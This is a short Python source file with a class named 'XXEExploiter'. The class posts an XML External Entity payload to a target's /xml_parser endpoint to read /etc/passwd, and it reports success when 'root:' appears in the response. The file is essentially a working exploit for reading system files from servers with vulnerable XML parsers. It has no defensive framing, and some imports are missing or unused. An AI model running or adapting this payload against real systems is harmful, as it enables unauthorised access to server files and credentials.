from lxml import etree

class XXEExploiter:
    def __init__(self, target: str):
        self.target = target

    def test_xxe(self) -> Optional[str]:
        payload = """
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <data>&xxe;</data>
        """
        try:
            response = requests.post(
                f"{self.target}/xml_parser",
                data=payload,
                headers={"Content-Type": "application/xml"}
            )
            if "root:" in response.text:
                return "XXE successful (file read)"
        except Exception as e:
            print(f"XXE failed: {e}")
        return None
